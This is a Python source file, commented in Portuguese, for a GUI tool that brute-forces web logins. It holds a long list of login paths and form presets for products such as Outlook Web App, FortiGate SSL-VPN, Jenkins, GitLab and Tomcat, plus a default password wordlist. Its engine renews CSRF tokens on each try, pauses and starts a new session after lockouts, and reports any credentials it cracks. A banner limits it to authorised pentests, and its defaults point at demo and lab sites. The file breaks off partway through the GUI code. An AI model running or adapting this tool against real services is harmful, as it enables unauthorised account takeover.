#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  LOGIN BRUTE FORCE MULTI-ENDPOINT - PENTEST EDITION (GREEN)
# ============================================================

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import queue
import time
import os
import re
import html
from urllib.parse import urljoin
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------------------------------------------------ constantes
LOCKOUT_PAUSA_SEGUNDOS = 300
RETRY_PAUSA_SEGUNDOS = 10

# ---------------------------------------------------------------- caminhos
CAMINHOS_LOGIN = [
    # --- genéricos / modernos ---
    "/login", "/signin", "/sign-in", "/sign_in", "/signup",
    "/logon", "/log-in", "/auth", "/auth/login", "/auth/signin",
    "/authenticate", "/session/new", "/sessions/new",
    "/accounts/login", "/account/login", "/account/signin",
    "/users/login", "/users/sign_in", "/user/login", "/user/signin",
    "/member/login", "/members/login", "/customer/login", "/client/login",
    "/portal/login", "/dashboard/login", "/panel/login",
    "/admin/login", "/admin/signin", "/admincp", "/adminpanel",
    "/dashboard", "/admin/dashboard",
    # --- PHP ---
    "/login.php", "/auth/login.php", "/admin/login.php",
    "/index.php/login", "/index.php/auth/login", "/login/index.php",
    "/index.php?route=account/login",                       # OpenCart
    "/admin/index.php", "/administrator/index.php",          # Joomla
    "/wp-login.php", "/wp-admin",                            # WordPress
    "/user/auth/login", "/sign-in.php", "/authenticate.php",
    # --- ASP.NET ---
    "/login.aspx", "/Account/Login", "/Account/LogOn",
    "/secure/login.aspx", "/Admin/Login.aspx", "/signin.aspx",
    # --- Java / J2EE ---
    "/login.jsp", "/j_security_check", "/login.action",       # Struts
    "/login.do", "/auth/login.jsp", "/webapp/login.jsp",
    "/console/login/LoginForm.jsp",                           # WebLogic
    "/cas/login", "/cas-server-webapp/login",                 # CAS SSO
    # --- apps conhecidos ---
    "/web/index.php/auth/login",        # OrangeHRM 5
    "/web/index.php/login",
    "/symfony/web/index.php/auth/login",
    "/dvwa/login.php", "/mutillidae/index.php?page=login.php",
    "/owa/auth/logon.aspx",                                   # Outlook Web App
    "/Remote/login",                                          # FortiGate SSL-VPN
    "/cgi-bin/luci",                                          # OpenWrt
    "/api/login", "/api/auth/login", "/api/v1/login",         # APIs REST
    "/api/auth/signin", "/api/token", "/oauth/token",
    "/#/login", "/login.html", "/login.htm", "/index.html#/login",
    "/tomcat/manager/html", "/manager/html",                  # Tomcat
    "/jenkins/login", "/login?from=%2F",                      # Jenkins
    "/gitlab/users/sign_in",                                  # GitLab
    "/gitea/user/login", "/gitea/login",                      # Gitea
    "/redmine/login", "/issue/login",
    "/jira/login.jsp", "/jira/secure/Dashboard.jspa",
    "/confluence/login.action", "/dologin",
    "/moodle/login/index.php",                                # Moodle
    "/owncloud/index.php/login", "/nextcloud/index.php/login",# Cloud files
    "/roundcube/?_task=login", "/webmail/", "/mail/login",    # Webmail
    "/phpmyadmin/index.php", "/pma/",                         # phpMyAdmin
    "/actuator/login", "/spring_security_login",              # Spring
    "/nagios/cgi-bin/login.cgi",                              # Nagios
    "/kibana/login", "/app/login",                            # Kibana
    "/practice-test-login", "/practice-test-login/",          # Labs
    "/setup.php",                                             # DVWA setup
]

# Presets do modo manual (SPA / sem formulário clássico / campos extras)
PRESETS = {
    "OrangeHRM 5 (demo)": {
        "path": "/web/index.php/auth/login",
        "action": "/web/index.php/auth/validate",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "_token",
        "extra": "",
    },
    "DVWA": {
        "path": "/login.php",
        "action": "/login.php",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "user_token",
        "extra": "",
    },
    "WordPress": {
        "path": "/wp-login.php",
        "action": "/wp-login.php",
        "method": "post",
        "user": "log",
        "pass": "pwd",
        "token": "",
        "extra": "wp-submit=Log+In;redirect_to=%2Fwp-admin%2F;testcookie=1",
    },
    "Herokuapp (the-internet)": {
        "path": "/login",
        "action": "/authenticate",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "",
        "extra": "",
    },
    "SauceDemo (Swag Labs)": {
        "path": "/",
        "action": "/",
        "method": "post",
        "user": "user-name",
        "pass": "password",
        "token": "",
        "extra": "login-button=Login",
    },
    "Practice Test Automation": {
        "path": "/practice-test-login/",
        "action": "/practice-test-login/",
        "method": "post",
        "user": "username",
        "pass": "password",
        "token": "",
        "extra": "",
    },
    "Jenkins": {
        "path": "/login",
        "action": "/j_spring_security_check",
        "method": "post",
        "user": "j_username",
        "pass": "j_password",
        "token": "",
        "extra": "from=/;Submit=Sign+in",
    },
    "Tomcat Manager": {
        "path": "/manager/html",
        "action": "/manager/html",
        "method": "post",
        "user": "j_username",
        "pass": "j_password",
        "token": "",
        "extra": "",
    },
    "FortiGate SSL-VPN": {
        "path": "/remote/login",
        "action": "/remote/logincheck",
        "method": "post",
        "user": "username",
        "pass": "secretkey",
        "token": "",
        "extra": "ajax=1",
    },
    "GitLab": {
        "path": "/users/sign_in",
        "action": "/users/sign_in",
        "method": "post",
        "user": "user[login]",
        "pass": "user[password]",
        "token": "authenticity_token",
        "extra": "user[remember_me]=0",
    },
}

# URL termina em segmento com login/signin/auth/logon -> já é página de login
FIM_LOGIN_RE = re.compile(r"/([^/]*(?:login|signin|logon|auth)[^/]*)/?$", re.I)
PAGINA_SETUP_RE = re.compile(r"/setup\.php$", re.IGNORECASE)

USER_RE = re.compile(r"(user|username|login|email|account|j_username|usuario|mail|utilizador)", re.I)
TOKEN_RE = re.compile(r"(csrf|token|nonce|authenticity)", re.I)
PASS_RE = re.compile(r"(pass|senha|pwd)", re.I)

FALHA_RE = re.compile(
    r"(login failed|invalid (username|password|credentials?)|incorrect password|"
    r"wrong password|senha incorreta|credenciais inv[áa]lidas|"
    r"usu[áa]rio ou senha (inv[áa]lido|incorret)|autentica[çc][ãa]o falhou|"
    r"falha no login|access denied|login inv[áa]lido|"
    r"password.*(wrong|invalid|incorrect)|usu[áa]rio n[ãa]o encontrado|"
    r"(your )?(username|user name|password) is (invalid|incorrect)|"
    r"epic sadface|do not match any user|"
    r"account (is )?locked|maximum login attempts|"
    r"exceeded the maximum number of login attempts|"
    r"too many (failed )?login attempts|muitas tentativas|"
    r"invalid_csrf_token|csrf token validation failed)",
    re.IGNORECASE,
)
LOCKOUT_RE = re.compile(
    r"(account (is )?locked|locked out|maximum login attempts|"
    r"exceeded the maximum number of login attempts|"
    r"too many (failed )?login attempts|muitas tentativas|bloquead)",
    re.IGNORECASE,
)
SUCESSO_RE = re.compile(
    r"(dashboard|logout|log out|bem-vindo|welcome|congratulations|"
    r"logged in successfully)",
    re.IGNORECASE,
)


def montar_login_url(url):
    url = (url or "").strip()
    url = re.sub(r"\?.*$", "", url)
    if not url:
        return ""
    if PAGINA_SETUP_RE.search(url):
        return PAGINA_SETUP_RE.sub("/login.php", url)
    if "orangehrm" in url.lower() and "/web/index.php" not in url:
        return url.rstrip("/") + "/web/index.php/auth/login"
    if re.match(r"^https?://[^/]+$", url):
        return url + "/"
    if FIM_LOGIN_RE.search(url):
        return url
    if "/" in url.split("://", 1)[-1]:
        return url
    return url + "/login.php"


DEFAULT_WORDLIST = [
    "password", "admin", "admin123", "123456", "12345678", "dvwa", "letmein",
    "root", "toor", "test", "teste", "senha", "senha123", "qwerty", "abc123",
    "welcome", "monkey", "dragon", "master", "iloveyou", "batman", "p@ssw0rd",
    "Passw0rd!", "Password123", "administrator", "changeme", "1234", "12345",
    "default", "user", "usuario", "dvwa123", "secret", "security", "hacker",
    "admin123456", "SuperSecretPassword!", "password1", "password12",
    "password1234", "password2024", "password2025", "password2026",
    "admin1", "admin12", "admin1234", "admin12345", "administrator123",
    "guest", "guest123", "demo", "demo123", "testing", "login", "login123",
    "pass", "pass123", "passwd", "passwd123", "senha1234", "senha2024",
    "senha2025", "senha2026", "welcome1", "welcome123", "letmein123",
    "qwerty123", "qwertyuiop", "asdfgh", "asdf123", "zxcvbnm", "abcd1234",
    "master123", "football", "baseball", "soccer", "superman", "pokemon",
    "naruto", "internet", "computer", "windows", "linux", "ubuntu", "debian",
    "kali", "raspberry", "oracle", "mysql", "postgres", "mongodb", "docker",
    "kubernetes", "root123", "root1234", "adminadmin", "1234567", "123456789",
    "1234567890", "111111", "000000", "121212", "654321", "987654321",
    "1q2w3e4r", "1qaz2wsx", "zaq12wsx", "!@#$%^&*", "P@ssw0rd", "Welcome1",
    "Welcome123", "Admin123", "Admin@123", "Root@123", "Password@123",
    "Password123!", "Qwerty123!", "mutillidae", "owasp", "owaspbwa",
    "metasploitable", "trustno1", "welcomehome", "summer2024", "summer2025",
    "summer2026", "winter2024", "winter2025", "spring2025", "autumn2025",
    "administrator1", "sysadmin", "sysadmin123", "operator", "operator123",
    "support", "support123", "backup", "backup123", "service", "service123",
    "manager", "manager123", "company123", "office123", "network123",
    "server123", "localadmin", "local123", "temp123", "temp2025", "dev123",
    "developer", "developer123", "qa123", "staging123", "production",
    "production123", "toor123", "kalilinux", "penetration", "pentest",
    "hacker123", "cyber", "cyber123", "matrix", "neo", "morpheus",
]


def parse_campos_extras(texto):
    extras = {}
    if not texto:
        return extras
    for parte in re.split(r"[;,]", texto):
        parte = parte.strip()
        if not parte or "=" not in parte:
            continue
        nome, _, valor = parte.partition("=")
        extras[nome.strip()] = valor.strip()
    return extras


# ================================================================ ENGINE
class BruteForceLogin:
    def __init__(self, login_url, username, passwords, log, progress, stop_event,
                 result_callback, verbose=True, renovar_token=True, delay=0.0,
                 inicio=0, manual=None):
        self.login_url = montar_login_url(login_url)
        self.username = username
        self.passwords = passwords
        self.log = log
        self.progress = progress
        self.stop = stop_event
        self.result_callback = result_callback
        self.verbose = verbose
        self.renovar_token = renovar_token
        self.delay = delay
        self.inicio = inicio
        self.manual = manual or {}
        self.spa = False
        self.session = requests.Session()
        self._config_headers()
        self.found = False
        self._ultimo_texto = ""

    def _config_headers(self):
        self.session.headers.update({
            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                           "AppleWebKit/537.36 (KHTML, like Gecko) "
                           "Chrome/126.0 Safari/537.36"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
        })

    def _sleep_interruptivel(self, segundos):
        fim = time.time() + segundos
        while time.time() < fim:
            if self.stop.is_set():
                return False
            time.sleep(min(0.2, fim - time.time()))
        return True

    def _get_pagina_login(self):
        try:
            r = self.session.get(self.login_url, verify=False, timeout=10)
        except requests.exceptions.RequestException as e:
            self.log(f"[!] Erro ao obter a página de login: {e}")
            return None
        if r.status_code == 404:
            self.log("[!] HTTP 404: página de login não encontrada neste caminho.")
            self.log("[i] Use o menu 'Caminho comum' (ex.: /auth/login.php, /login.jsp).")
            return None
        if r.status_code in (401, 403):
            self.log(f"[!] HTTP {r.status_code}: página protegida (Basic Auth?) — "
                     f"este script não cobre autenticação HTTP básica.")
            return None
        return r

    def _parse_form(self, html_texto, page_url):
        soup = BeautifulSoup(html_texto, "html.parser")
        form = None
        for f in soup.find_all("form"):
            if f.find("input", {"type": "password"}):
                form = f
                break
        if form is None:
            return None

        action_url = urljoin(page_url, form.get("action") or page_url)
        method = (form.get("method") or "post").lower()
        campos, submit = {}, {}
        user_field = pass_field = None
        inputs = form.find_all("input")

        for inp in inputs:
            nome = inp.get("name")
            if not nome:
                continue
            tipo = (inp.get("type") or "text").lower()
            valor = inp.get("value") or ""
            if tipo == "password":
                if pass_field is None:
                    pass_field = nome
                campos[nome] = ""
            elif tipo in ("submit", "button", "image"):
                submit[nome] = valor
            elif tipo in ("text", "hidden", "email", "tel", "number", "search", "url"):
                campos[nome] = valor

        for btn in form.find_all("button"):
            if (btn.get("type") or "submit").lower() in ("submit", "button"):
                nome = btn.get("name")
                if nome and nome not in submit:
                    submit[nome] = btn.get("value") or ""

        for sel in form.find_all("select"):
            nome = sel.get("name")
            if nome and nome not in campos:
                opcao = sel.find("option", selected=True) or sel.find("option")
                campos[nome] = opcao.get("value", "") if opcao else ""

        for ta in form.find_all("textarea"):
            nome = ta.get("name")
            if nome and nome not in campos:
                campos[nome] = ta.get_text()

        if pass_field is None:
            for inp in inputs:
                nome = inp.get("name") or ""
                if PASS_RE.search(nome):
                    pass_field = nome
                    campos.setdefault(nome, "")
                    break
        if pass_field is None:
            return None

        for inp in inputs:
            nome = inp.get("name") or ""
            tipo = (inp.get("type") or "text").lower()
            if tipo in ("text", "email", "tel", "number", "search") and USER_RE.search(nome):
                user_field = nome
                break
        if user_field is None:
            for inp in inputs:
                nome = inp.get("name") or ""
                tipo = (inp.get("type") or "text").lower()
                if (tipo in ("text", "email", "tel", "number", "search") and nome
                        and nome != pass_field and not TOKEN_RE.search(nome)):
                    user_field = nome
                    break
        if user_field is None:
            return None

        token_field = token_val = None
        for inp in inputs:
            nome = inp.get("name") or ""
            tipo = (inp.get("type") or "text").lower()
            if tipo == "hidden" and TOKEN_RE.search(nome):
                token_field = nome
                token_val = inp.get("value") or ""
                break

        return (action_url, method, campos, submit,
                user_field, pass_field, token_field, token_val)

    def _extrair_token(self, texto):
        if not texto:
            return None
        soup = BeautifulSoup(texto, "html.parser")
        for inp in soup.find_all("input"):
            nome = inp.get("name") or ""
            if TOKEN_RE.search(nome):
                valor = inp.get("value")
                if valor:
                    return html.unescape(valor)
        for meta in soup.find_all("meta"):
            nome = meta.get("name") or ""
            if TOKEN_RE.search(nome):
                valor = meta.get("content")
                if valor:
                    return html.unescape(valor)
        m = re.search(r"<auth-login[^>]*:token\s*=\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            valor = html.unescape(m.group(1))
            if len(valor) >= 2 and valor[0] == valor[-1] == '"':
                valor = valor[1:-1]
            return valor
        m = re.search(r"data-(?:csrf-?token|token)\s*=\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            return html.unescape(m.group(1))
        m = re.search(r"[\"']csrfToken[\"']\s*:\s*[\"']([^\"']+)[\"']", texto, re.I)
        if m:
            return html.unescape(m.group(1))
        return None

    def _tem_campo_senha(self, texto):
        return bool(texto) and re.search(
            r"type\s*=\s*['\"]password['\"]", texto, re.I) is not None

    def _detectar_conhecido(self, texto, url):
        amostra = (url or "") + " " + (texto or "")[:4000]
        if re.search(r"orangehrm|auth-login", amostra, re.I):
            return {
                "nome": "OrangeHRM 5",
                "action": "/web/index.php/auth/validate",
                "method": "post",
                "user_field": "username",
                "pass_field": "password",
                "token_field": "_token",
                "extra": {},
            }
        if re.search(r"practice-test-login", amostra, re.I):
            return {
                "nome": "Practice Test Automation",
                "action": "/practice-test-login/",
                "method": "post",
                "user_field": "username",
                "pass_field": "password",
                "token_field": None,
                "extra": {},
            }
        if re.search(r"j_spring_security_check|jenkins", amostra, re.I):
            return {
                "nome": "Jenkins",
                "action": "/j_spring_security_check",
                "method": "post",
                "user_field": "j_username",
                "pass_field": "j_password",
                "token_field": None,
                "extra": {"from": "/", "Submit": "Sign in"},
            }
        return None

    def _montar_form_manual(self, page_url, texto):
        action = (self.manual.get("action") or "").strip()
        method = (self.manual.get("method") or "post").lower()
        user_field = (self.manual.get("user_field") or "").strip()
        pass_field = (self.manual.get("pass_field") or "").strip()
        token_field = (self.manual.get("token_field") or "").strip() or None
        if not (action and user_field and pass_field):
            self.log("[!] Modo manual incompleto: action, campo usuário e "
                     "campo senha são obrigatórios.")
            return None
        action_url = urljoin(page_url, action)
        campos = dict(self.manual.get("extra") or {})
        token_val = self._extrair_token(texto) if token_field else None
        return (action_url, method, campos, {}, user_field, pass_field,
                token_field, token_val)

    def _obter_formulario(self, pagina):
        if self.manual:
            return self._montar_form_manual(pagina.url, pagina.text)
        return self._parse_form(pagina.text, pagina.url)

    def _tentar(self, senha, campos, submit, token_field, token_val,
                action_url, method, user_field, pass_field):
        data = dict(campos)
        data[user_field] = self.username
        data[pass_field] = senha
        if submit:
            data.update(submit)
        if token_field and token_val:
            data[token_field] = token_val

        try:
            if method == "get":
                r = self.session.get(action_url, params=data,
                                     headers={"Referer": self.login_url},
                                     verify=False, timeout=10, allow_redirects=False)
            else:
                r = self.session.post(action_url, data=data,
                                      headers={"Referer": self.login_url},
                                      verify=False, timeout=10, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            self.log(f"[!] Erro na tentativa: {e}")
            return None

        self._ultimo_texto = r.text or ""

        if r.status_code == 429:
            retry = r.headers.get("Retry-After", "")
            pausa = int(retry) if retry.strip().isdigit() else RETRY_PAUSA_SEGUNDOS
            self.log(f"[!] HTTP 429 (rate limit). Aguardando {pausa}s...")
            self._sleep_interruptivel(pausa)
            return None

        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if re.search(r"(login|logon|signin|auth|error|failed|denied)", loc, re.I):
                return False
            return True

        if r.status_code in (401, 403):
            return False

        ct = r.headers.get("Content-Type", "")
        if "json" in ct.lower():
            if re.search(r'"success"\s*:\s*true|"token"\s*:|"authenticated"\s*:\s*true|'
                         r'"status"\s*:\s*"(ok|success)"', r.text, re.I):
                return True
            return False

        if LOCKOUT_RE.search(r.text) or FALHA_RE.search(r.text):
            return False

        if SUCESSO_RE.search(r.text):
            return True

        if self.spa:
            return False

        if not self._tem_campo_senha(r.text):
            return True
        return False

    def run(self):
        total = len(self.passwords)
        retomando = self.inicio > 0

        if retomando:
            self.log(f"\n[*] Retomando da senha: {self.inicio + 1} "
                     f"({self.passwords[self.inicio]}) — "
                     f"{total - self.inicio} restantes")
            self.log("")
        else:
            self.log(f"\n[*] Alvo    : {self.login_url}")
            self.log(f"[*] Usuário : {self.username} | Senhas a testar: {total}")
            self.log("")

        pagina = self._get_pagina_login()
        if pagina is None:
            return
        if not retomando:
            self.log(f"[*] Página de login obtida (HTTP {pagina.status_code}, "
                     f"{len(pagina.text)} bytes)")

        if "setup.php" in pagina.url.lower():
            self.log("")
            self.log("[!] DVWA redirecionou para setup.php -> banco de dados NÃO criado.")
            self.log(f"[!] Acesse {pagina.url.split('?')[0]} e clique em "
                     f"'Create / Reset Database'.")
            return

        form = None
        if not self.manual:
            form = self._parse_form(pagina.text, pagina.url)
            if form is None:
                auto = self._detectar_conhecido(pagina.text, self.login_url)
                if auto is None:
                    self.log("")
                    self.log("[!] Nenhum formulário de login encontrado (campo type=password ausente).")
                    self.log("[i] A página pode ser renderizada via JavaScript (SPA/React/Vue).")
                    self.log("[i] 1) Confirme a URL correta (ex.: /web/index.php/auth/login no OrangeHRM).")
                    self.log("[i] 2) Ou ative o painel 'Modo manual (SPA ou campos customizados)'")
                    self.log("[i]    e escolha um preset, informando action, campos e token.")
                    return
                self.log("")
                self.log(f"[+] Site conhecido detectado ({auto.get('nome', 'aplicação')}) — "
                         f"usando configuração automática\n")
                self.manual = auto
                self.spa = True
                form = self._obter_formulario(pagina)
        else:
            self.spa = True
            form = self._obter_formulario(pagina)

        if form is None:
            self.log("[!] Não foi possível montar o formulário. Abortando.")
            return

        (action_url, method, campos, submit,
         user_field, pass_field, token_field, token_val) = form

        if not retomando:
            self.log(f"[*] Formulário : action={action_url} | method={method.upper()}")
            self.log(f"[*] Campo user : '{user_field}' | campo senha: '{pass_field}'")
            if campos:
                self.log(f"[*] Campos extras: {campos}")
            if submit:
                self.log(f"[*] Botão submit: {submit}")
            if token_field:
                self.log(f"[+] Token CSRF : '{token_field}' -> renovado a cada tentativa")
            else:
                self.log("[i] Token CSRF : não detectado -> atacando direto")
            self.log("")

        for idx in range(self.inicio, total):
            if self.stop.is_set():
                self.log("\n[*] Ataque interrompido pelo usuário. Clique em "
                         "▶ Iniciar Ataque ◀ para continuar de onde parou.")
                return
            if self.found:
                return
            i = idx + 1
            pwd = self.passwords[idx].strip()
            if not pwd:
                continue

            if self.verbose:
                self.log(f"[{i}/{total}] Testando:   {pwd}")
            self.progress(i, total, pwd)

            res = self._tentar(pwd, campos, submit, token_field, token_val,
                               action_url, method, user_field, pass_field)

            if res is None:
                if not self._sleep_interruptivel(2):
                    return
                continue

            if res:
                self.found = True
                self.log("")
                self.log("=" * 55)
                self.log(f"[+] SENHA ENCONTRADA: {pwd}")
                self.log(f"[+] Credenciais")
                self.log(f"[+] USUARIO: {self.username}   SENHA: {pwd}")
                self.log("=" * 55)
                self.result_callback(self.username, pwd)
                return

            if LOCKOUT_RE.search(self._ultimo_texto):
                self.log(f"[!] Lockout detectado. Nova sessão + pausa de "
                         f"{LOCKOUT_PAUSA_SEGUNDOS}s...")
                self.session = requests.Session()
                self._config_headers()
                if not self._sleep_interruptivel(LOCKOUT_PAUSA_SEGUNDOS):
                    self.log("[*] Pausa interrompida pelo usuário.")
                    return
                pagina2 = self._get_pagina_login()
                if pagina2 is None:
                    return
                form2 = self._obter_formulario(pagina2)
                if form2 is None:
                    self.log("[!] Formulário não encontrado após lockout. Abortando.")
                    return
                (action_url, method, campos, submit,
                 user_field, pass_field, token_field, token_val) = form2
                continue

            if token_field and self.renovar_token:
                token_val = self._extrair_token(self._ultimo_texto)
                if token_val is None:
                    if not self._sleep_interruptivel(1):
                        return
                    r2 = self._get_pagina_login()
                    token_val = self._extrair_token(r2.text) if r2 else None
                if token_val is None:
                    self.log("[!] Token não renovado; pausa de 3s...")
                    if not self._sleep_interruptivel(3):
                        return
                    r2 = self._get_pagina_login()
                    token_val = self._extrair_token(r2.text) if r2 else None
                if token_val is None:
                    self.log("[!] Abortando: servidor parou de fornecer token CSRF.")
                    return

            if self.delay > 0:
                if not self._sleep_interruptivel(self.delay):
                    return

        if not self.found:
            self.log(f"[-] Nenhuma senha válida encontrada em {total} tentativas.")


# ============================================================ GUI (verde)
class App:
    # paleta hacker
    BG      = "#0a0f0a"   # fundo quase preto
    PANEL   = "#101710"   # painéis
    FG      = "#00ff41"   # verde matrix
    FG_DIM  = "#00a828"   # verde escuro
    ACCENT  = "#39ff14"   # verde neon
    ERRO    = "#ff3333"
    ACHADO  = "#ff7518"   # cor abóbora (pumpkin) p/ senha encontrada
    FONT    = ("Consolas", 10)
    FONT_B  = ("Consolas", 10, "bold")

    def __init__(self, root):
        self.root = root
        root.title("[ Brute Force Login ] ")
        root.geometry("1000x850")
        root.resizable(True, True)
        root.configure(bg=self.BG)

        self.stop_event = threading.Event()
        self.worker = None
        self.queue = queue.Queue()
        self.senha_encontrada = None
        self.proximo_indice = 0
        self.fonte_wordlist = ""
        self.parado_pelo_usuario = False
        self._aplicar_estilo()
        self._montar_widgets()
        root.protocol("WM_DELETE_WINDOW", self.on_close)
        self._poll_queue()
        self._animar_titulo()

    # ------------------------------------------------------------- estilo
    def _aplicar_estilo(self):
        style = ttk.Style(self.root)
        style.theme_use("clam")
        style.configure(".", background=self.BG, foreground=self.FG,
                        fieldbackground=self.PANEL, font=self.FONT)
        style.configure("TFrame", background=self.BG)
        style.configure("TLabel", background=self.BG, foreground=self.FG)
        style.configure("TLabelframe", background=self.BG,
                        foreground=self.ACCENT, bordercolor=self.FG_DIM)
        style.configure("TLabelframe.Label", background=self.BG,
                        foreground=self.ACCENT, font=self.FONT_B)
        style.configure("TEntry", fieldbackground=self.PANEL,
                        foreground=self.FG, insertcolor=self.FG,
                        bordercolor=self.FG_DIM)

        # Combobox: fundo preto, letra verde
        style.configure("TCombobox",
                        fieldbackground="#050805",      # fundo do campo (preto)
                        background="#050805",           # fundo do botão/entry
                        foreground="#00ff41",           # letra verde
                        arrowcolor="#39ff14",           # seta verde neon
                        bordercolor="#00a828",
                        insertcolor="#00ff41",
                        selectbackground="#00ff41",
                        selectforeground="#000000")
        style.map("TCombobox",
                  fieldbackground=[("readonly", "#050805"),
                                   ("disabled", "#0a0f0a")],
                  background=[("readonly", "#050805")],
                  foreground=[("readonly", "#00ff41"),
                              ("disabled", "#004411")],
                  arrowcolor=[("active", "#ffffff")])

        style.configure("TCheckbutton", background=self.BG, foreground=self.FG)
        style.map("TCheckbutton",
                  background=[("active", self.BG)],
                  foreground=[("active", self.ACCENT)])
        style.configure("TSpinbox", fieldbackground=self.PANEL,
                        foreground=self.FG, arrowcolor=self.ACCENT,
                        bordercolor=self.FG_DIM)
        style.configure("TProgressbar", background=self.ACCENT,
                        troughcolor=self.PANEL, bordercolor=self.BG,
                        lightcolor=self.ACCENT, darkcolor=self.ACCENT)
        style.configure("Hack.TButton", background=self.PANEL,
                        foreground=self.ACCENT, font=self.FONT_B,
                        bordercolor=self.FG_DIM, focuscolor=self.ACCENT)
        style.map("Hack.TButton",
                  background=[("active", "#1a2f1a"), ("pressed", "#0f220f")],
                  foreground=[("active", "#ffffff"), ("disabled", "#004411")])
        style.configure("Danger.TButton", background=self.PANEL,
                        foreground=self.ERRO, font=self.FONT_B,
                        bordercolor="#661111")
        style.map("Danger.TButton",
                  background=[("active", "#2f1a1a"), ("pressed", "#220f0f")])
        self.root.option_add("*TCombobox*Listbox.background", self.PANEL)
        self.root.option_add("*TCombobox*Listbox.foreground", self.FG)
        self.root.option_add("*TCombobox*Listbox.selectBackground", self.ACCENT)
        self.root.option_add("*TCombobox*Listbox.selectForeground", "#000000")

    def _montar_widgets(self):
        banner = tk.Label(
            self.root,
            text=("╔══════════════════════════════════════════════╗\n"
                  "║          ▓▓ BRUTE FORCE LOGIN ▓▓             ║\n"
                  "║        [ authorized pentest use only ]       ║\n"
                  "╚══════════════════════════════════════════════╝"),
            bg=self.BG, fg=self.ACCENT, font=("Consolas", 11, "bold"),
            justify="left")
        banner.pack(pady=(8, 2))

        # ------------------------------------------------ alvo
        frm = ttk.LabelFrame(self.root, text=" :: Configuração do Alvo :: ")
        frm.pack(fill="x", padx=10, pady=4)

        ttk.Label(frm, text="URL (base ou página de login):").grid(
            row=0, column=0, sticky="w", padx=5, pady=4)
        self.url_var = tk.StringVar(
            value="https://opensource-demo.orangehrmlive.com/web/index.php/auth/login")
        ttk.Entry(frm, textvariable=self.url_var, width=52).grid(
            row=0, column=1, sticky="we", padx=5, pady=4)

        ttk.Label(frm, text="Caminho comum:").grid(
            row=1, column=0, sticky="w", padx=5, pady=4)
        self.path_var = tk.StringVar()
        self.path_combo = ttk.Combobox(frm, textvariable=self.path_var,
                                       values=CAMINHOS_LOGIN,
                                       state="readonly", width=50)
        self.path_combo.grid(row=1, column=1, sticky="we", padx=5, pady=4)
        self.path_combo.bind("<<ComboboxSelected>>", self.aplicar_caminho)

        ttk.Label(frm, text="Usuário:").grid(
            row=2, column=0, sticky="w", padx=5, pady=4)
        self.user_var = tk.StringVar(value="Admin")
        ttk.Entry(frm, textvariable=self.user_var, width=52).grid(
            row=2, column=1, sticky="we", padx=5, pady=4)

        ttk.Label(frm, text="Wordlist:").grid(
            row=3, column=0, sticky="w", padx=5, pady=4)
        self.wordlist_var = tk.StringVar(value="")
        ttk.Entry(frm, textvariable=self.wordlist_var, width=52).grid(
            row=3, column=1, sticky="we", padx=5, pady=4)
        ttk.Button(frm, text="Procurar...", style="Hack.TButton",
                   command=self.browse).grid(row=3, column=2, padx=5, pady=4)

        opts = ttk.Frame(frm)
        opts.grid(row=4, column=1, sticky="w", padx=5, pady=4)
        self.verbose_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opts, text="Mostrar cada tentativa",
                        variable=self.verbose_var).pack(side="left", padx=4)
        self.token_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(opts, text="Renovar token CSRF",
                        variable=self.token_var).pack(side="left", padx=4)
        ttk.Label(opts, text="Delay (s):").pack(side="left", padx=(8, 2))
        self.delay_var = tk.DoubleVar(value=0.0)
        ttk.Spinbox(opts, from_=0.0, to=10.0, increment=0.5,
                    textvariable=self.delay_var, width=5).pack(side="left")
        frm.columnconfigure(1, weight=1)

        # --------------------------------------- modo manual (SPA/extras)
        frm_man = ttk.LabelFrame(
            self.root,
            text=" :: Modo manual (SPA ou campos customizados) — ignorado se não ativado :: ")
        frm_man.pack(fill="x", padx=10, pady=4)

        linha0 = ttk.Frame(frm_man)
        linha0.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha0, text="Preset:").pack(side="left")
        self.preset_var = tk.StringVar()
        self.preset_combo = ttk.Combobox(linha0, textvariable=self.preset_var,
                                         values=list(PRESETS.keys()),
                                         state="readonly", width=30)
        self.preset_combo.pack(side="left", padx=4)
        self.preset_combo.bind("<<ComboboxSelected>>", self.aplicar_preset)
        self.manual_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(linha0, text="Ativar modo manual",
                        variable=self.manual_var).pack(side="left", padx=8)

        linha1 = ttk.Frame(frm_man)
        linha1.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha1, text="Action:").pack(side="left")
        self.man_action_var = tk.StringVar()
        ttk.Entry(linha1, textvariable=self.man_action_var,
                  width=52).pack(side="left", padx=4)
        ttk.Label(linha1, text="Método:").pack(side="left")
        self.man_method_var = tk.StringVar(value="POST")
        ttk.Combobox(linha1, textvariable=self.man_method_var,
                     values=["POST", "GET"], state="readonly",
                     width=6).pack(side="left")

        linha2 = ttk.Frame(frm_man)
        linha2.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha2, text="Campo usuário:").pack(side="left")
        self.man_user_var = tk.StringVar(value="username")
        ttk.Entry(linha2, textvariable=self.man_user_var,
                  width=14).pack(side="left", padx=4)
        ttk.Label(linha2, text="Campo senha:").pack(side="left")
        self.man_pass_var = tk.StringVar(value="password")
        ttk.Entry(linha2, textvariable=self.man_pass_var,
                  width=14).pack(side="left", padx=4)
        ttk.Label(linha2, text="Token CSRF:").pack(side="left")
        self.man_token_var = tk.StringVar(value="_token")
        ttk.Entry(linha2, textvariable=self.man_token_var,
                  width=20).pack(side="left", padx=4)

        linha3 = ttk.Frame(frm_man)
        linha3.pack(fill="x", padx=5, pady=2)
        ttk.Label(linha3, text="Campos extras:").pack(side="left")
